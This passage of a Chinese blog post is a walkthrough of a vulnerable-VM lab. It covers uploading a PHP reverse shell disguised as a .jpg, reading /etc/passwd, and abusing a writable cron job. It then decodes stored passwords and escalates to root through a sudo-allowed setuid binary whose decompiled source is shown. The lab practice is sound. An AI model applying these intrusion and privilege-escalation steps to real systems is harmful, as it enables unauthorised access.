IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR<br>U5ErkJggg==</p>
</blockquote>
<ul>
<li>解码是一张png格式图片，于是我们尝试利用如下命令：</li>
</ul>
<blockquote>
<p>base64 -d /tmp/encoded.txt decoded.png</p>
</blockquote>
<ul>
<li>得到猜测是密码的图片</li>
</ul>
<p><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_18.jpg" alt=""></p>
<ul>
<li>另外由于之前的页面源码上的一段注释</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- </span><br><span class="line">TODO:</span><br><span class="line">We need to clean this up for production. I left some junk in here to make testing easier.</span><br><span class="line"></span><br><span class="line">- by eezeepz</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>猜测用户名为<strong>eezeepz</strong>，于是成功登录，要求上传图片，利用shell（可反弹的shell：<a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell），简单更改里面的源码为自己的IP和端口，然后将后缀附加为`.jpg`，上传成功，回显如下信息：" target="_blank" rel="noopener">http://pentestmonkey.net/tools/web-shells/php-reverse-shell），简单更改里面的源码为自己的IP和端口，然后将后缀附加为`.jpg`，上传成功，回显如下信息：</a></li>
</ul>
<p><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_23.jpg" alt=""></p>
<ul>
<li>猜测地址在<strong>/uploads/shell.jpg</strong>，一试果然成功反弹shell</li>
</ul>
<p><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_25.jpg" alt=""></p>
<ul>
<li>查看用户情况</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">games:x:12:100:games:/usr/games:/sbin/nologin</span><br><span class="line">gopher:x:13:30:gopher:/var/gopher:/sbin/nologin</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">nobody:x:99:99:Nobody:/:/sbin/nologin</span><br><span class="line">vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin</span><br><span class="line">saslauth:x:499:76:Saslauthd user:/var/empty/saslauth:/sbin/nologin</span><br><span class="line">postfix:x:89:89::/var/spool/postfix:/sbin/nologin</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</span><br><span class="line">apache:x:48:48:Apache:/var/www:/sbin/nologin</span><br><span class="line">mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash</span><br><span class="line">vboxadd:x:498:1::/var/run/vboxadd:/bin/false</span><br><span class="line">eezeepz:x:500:500::/home/eezeepz:/bin/bash</span><br><span class="line">admin:x:501:501::/home/admin:/bin/bash</span><br><span class="line">fristigod:x:502:502::/var/fristigod:/bin/bash</span><br><span class="line">fristi:x:503:100::/var/www:/sbin/nologin</span><br></pre></td></tr></table></figure>
<ul>
<li>尝试<code>su</code>，<code>sudo</code>，需要密码，但之前的密码不行，转而查看<strong>home</strong>目录下的用户</li>
</ul>
<p><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_27.jpg" alt=""></p>
<ul>
<li>cd到eezeepz用户目录，查看目录下文件</li>
</ul>
<p><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_28.jpg" alt=""></p>
<ul>
<li>注意到<strong>notes.txt</strong>,查看</li>
</ul>
<p><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_29.jpg" alt=""></p>
<ul>
<li><p>根据提示，在<strong>/tmp</strong>下<code>touch</code>一个<strong>runthis</strong>文件，因为他会执行<strong>runthis</strong>中的命令，于是我们写入<br>命令<code>echo &quot;/usr/bin/../../bin/chmode -R 777 /home/admin&quot;&gt;/tmp/this</code></p>
</li>
<li><p>于是就可以读取<strong>/home/admin</strong>下的文件</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_32.jpg" alt=""></p>
<ul>
<li><p>cryptpass.py<br><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_33.jpg" alt=""></p>
</li>
<li><p>Cryptepass.txt<br><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_34.jpg" alt=""></p>
</li>
<li><p>whoisyourgodnow.txt<br><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_35.jpg" alt=""></p>
</li>
<li><p>根据加密方式，写出解密方法：</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import base64,codecs,sys</span><br><span class="line"></span><br><span class="line">def decodeString(str):</span><br><span class="line">	string = str[::-1]</span><br><span class="line">	string = string.encode(&quot;rot13&quot;)</span><br><span class="line">	return base64.b64decode(string)</span><br><span class="line"></span><br><span class="line">print decodeString(&quot;=RFn0AKnlMHMPIzpyuTI0ITG&quot;)</span><br><span class="line">print decodeString(&quot;mVGZ3O3omkJLmy2pcuTq&quot;)</span><br></pre></td></tr></table></figure>
<ul>
<li>得到了：</li>
</ul>
<blockquote>
<p>1.mVGZ3O3omkJLmy2pcuTq ：thisisalsopw123<br>2.=RFn0AKnlMHMPIzpyuTI0ITG ：LetThereBeFristi!</p>
</blockquote>
<ul>
<li>尝试登录用户：</li>
</ul>
<p><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_39.jpg" alt=""></p>
<ul>
<li><p>基本概念：</p>
<blockquote>
<p>1.tty(终端设备的统称):<br>tty一词源于Teletypes，或teletypewriters，原来指的是电传打字机，是通过串行线用打印机键盘通过阅读和发送信息的东西，后来这东西被键盘和显示器取代，所以现在叫终端比较合适。<br>终端是一种字符型设备，他有多种类型，通常使用tty来简称各种类型的终端设备。<br>2.pty（虚拟终端):<br>但是假如我们远程telnet到主机或使用xterm时不也需要一个终端交互么？是的，这就是虚拟终端pty(pseudo-tty)</p>
</blockquote>
</li>
<li><p>解决办法：</p>
<blockquote>
<p>Python -c ‘import pty;pty.spawn(“/bin/sh”)’</p>
</blockquote>
</li>
<li><p>为什么这样可以呢，找了一番：</p>
<blockquote>
<ol>
<li>Spawn a process, and connect its controlling terminal with the current process’s standard io. This is often used to baffle programs which insist on reading from the controlling terminal.</li>
<li>spawn 是通过 fork 方式实现，然后子进程执行具体的命令，然后父进程去获取终端的输出，强调获取数据而已</li>
<li>出于安全考虑，linux要求用户必须从终端设备（tty）中输入密码，而不是标准输入（stdin）。换句话说，sudo在你输入密码的时候本质上是读取了键盘，而不是bash里面输入的字符</li>
</ol>
</blockquote>
</li>
<li><p>然后可以进入fristigod账户：</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_41.jpg" alt=""></p>
<ul>
<li><code>ls -la</code></li>
</ul>
<p><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_43.jpg" alt=""></p>
<ul>
<li>到.secret_admin_stuff看看</li>
</ul>
<p><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_44.jpg" alt=""></p>
<ul>
<li>继续 ls -la 查看具体信息</li>
</ul>
<p><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_45.jpg" alt=""></p>
<ul>
<li>docom是一个可执行文件，但权限不够</li>
</ul>
<p><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_46.jpg" alt=""></p>
<ul>
<li>回去查看history（这一步其实在渗透的过程很重要，根据用户的命令历史搜集线索）</li>
</ul>
<p><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_47.jpg" alt=""></p>
<ul>
<li>可以看到 “fristigod”用户一直sudo来执行命令，尝试<code>sudo -l</code></li>
</ul>
<p><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_48.jpg" alt=""></p>
<ul>
<li>密码：<strong>LetThereBeFristi!</strong></li>
</ul>
<p><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_50.jpg" alt=""></p>
<ul>
<li>创建一个shell</li>
</ul>
<blockquote>
<p>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash</p>
</blockquote>
<ul>
<li>直接去看/root下的文件</li>
</ul>
<p><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_53.jpg" alt=""></p>
<p><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_54.jpg" alt=""></p>
<p>我们可以将doCom反编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char dest[8]; // [sp+10h] [bp-80h]@1</span><br><span class="line">  char v5; // [sp+18h] [bp-78h]@1</span><br><span class="line">  int v6; // [sp+70h] [bp-20h]@1</span><br><span class="line">  const char **i; // [sp+80h] [bp-10h]@7</span><br><span class="line">  __uid_t v8; // [sp+8Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  *(_QWORD *)dest = 0LL;</span><br><span class="line">  memset(&amp;v5, 0, 0x58uLL);</span><br><span class="line">  v6 = 0;</span><br><span class="line">  v8 = getuid();</span><br><span class="line">  if ( v8 != 503 )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(&quot;Nice try, but wrong user ;)\n&quot;, 1uLL, 0x1CuLL, stderr);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( argc &lt;= 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(&quot;Usage: ./program_name terminal_command ...&quot;, 1uLL, 0x2AuLL, stderr);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  strcat(dest, argv[1]);</span><br><span class="line">  for ( i = argv + 2; *i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    strcat(dest, &quot; &quot;);</span><br><span class="line">    strcat(dest, *i);</span><br><span class="line">  &#125;</span><br><span class="line">  setuid(0);</span><br><span class="line">  system(dest);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>strcat</strong>将两个char类型连接<br>逻辑就很明显了：<br>检查用户的id如果不等于503，打印如下内容</p>
<blockquote>
<p>Nice try, but wrong user ;)</p>
</blockquote>
<p>检查参数，并利用<strong>system</strong>执行所给参数</p>
<p>参考：<a href="http://sec-redclub.com/archives/741/" target="_blank" rel="noopener">http://sec-redclub.com/archives/741/</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/靶机/">靶机</a>
    </span>
    

    </div>

    
  </div>
</article>




<nav class="pagination">
  
  
  <a href="/page/2/" class="pagination-next">下一页</a>
  
</nav>
    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2019 damn1t
    
  </p>
</footer>
    
  </div>
</div>
</body>
</html>